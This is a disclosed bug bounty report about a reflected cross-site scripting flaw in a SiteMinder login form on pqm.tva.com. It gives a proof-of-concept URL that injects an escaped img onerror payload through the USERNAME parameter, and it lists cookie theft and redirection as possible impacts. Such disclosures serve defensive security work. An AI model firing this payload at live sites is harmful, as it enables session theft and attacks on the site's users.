# xss reflected - pqm.tva.com

## Report Details
- **Report ID**: 1363001
- **URL**: https://hackerone.com/reports/1363001
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-10-07T17:21:05.511Z
- **Disclosed**: 2023-10-13T12:31:49.078Z

## Reporter
- **Username**: thiagomarques
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: tennessee-valley-authority

## Vulnerability Information
POC:

https://pqm.tva.com/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7

## Impact

With the help of xss a hacker or attacker can perform social engineering on users by redirecting them from real website to fake one. hacker can steal their cookies and download a malware on their system, and there are many more attacking scenarios a skilled attacker can perform with xss.

## Attachments
- xss.png
